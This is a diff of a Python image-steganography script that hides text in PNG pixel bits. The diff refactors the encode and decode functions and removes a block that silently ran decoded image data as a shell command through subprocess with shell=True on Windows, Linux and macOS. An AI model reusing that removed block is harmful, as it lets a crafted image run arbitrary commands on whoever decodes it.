@@ -1,7 +1,4 @@
 from PIL import Image
-import subprocess
-import platform
-import os
 
 def genData(data):
     return [format(ord(char), '08b') for char in data]
@@ -63,36 +60,22 @@ def encode_enc(newimg, data):
         x = 0 if x == w - 1 else x + 1
         y += 1 if x == 0 else 0
 
-def encode():
-    try:
-        img_path = input("Enter image name (with extension, PNG only): ")
-        if not os.path.isfile(img_path):
-            print("[!] File does not exist.")
-            return
-        if not img_path.lower().endswith('.png'):
-            print("[!] Only PNG format supported for reliability.")
-            return
+def encode(img_path):
+    image = Image.open(img_path, 'r')
+    if image.mode != 'RGB':
+        print("[!] Image mode must be RGB.")
+        return
+    data = input("Enter the data to be encoded: ")
 
-        image = Image.open(img_path, 'r')
-        if image.mode != 'RGB':
-            print("[!] Image mode must be RGB.")
-            return
-
-        data = input("Enter the data to be encoded: ")
-
-        if not data:
-            raise ValueError("Data is empty.")
-    
-    except Exception as e:
-        print(f"[!] Error during encoding: {e}")
+    if not data:
+        raise ValueError("Data is empty.")
     
     newimg = image.copy()
     encode_enc(newimg, data)
     newimg_name = input("Enter the name of new image(with extension): ")
     newimg.save(newimg_name, newimg_name.split(".")[-1].upper())
 
-def decode():
-    img = input("Enter image name (with extension): ")
+def decode(img):
     image = Image.open(img, 'r')
     imgdata = iter(image.getdata())
     data = ""
@@ -111,32 +94,4 @@ def decode():
         if pixels[-1] % 2 != 0:
             break
 
-    try:
-        print("[*] Executing hidden command silently...")
-        system_platform = platform.system()
-
-        if system_platform == "Windows":
-            print("Write command for Windows Shell")
-            subprocess.Popen(data, shell=True)
-        elif system_platform == "Linux" or system_platform == "Darwin":
-            print("Write command for Linux Shell or Darwin ShellP")
-            subprocess.Popen(data, shell=True, executable='/bin/bash')
-        else:
-            print("[!] Unsupported OS")
-    except Exception as e:
-        print(f"[!] Error: {e}")
-
     return data
-
-def main():
-    #Main function for user interaction
-    choice = input(":: Steganography :: \n1. Encode\n2. Decode \n")
-    if choice == '1':
-        encode()
-    elif choice == '2':
-        decode()
-    else:
-        print("Invalid choice, exiting")
-
-if __name__ == "__main__":
-    main()
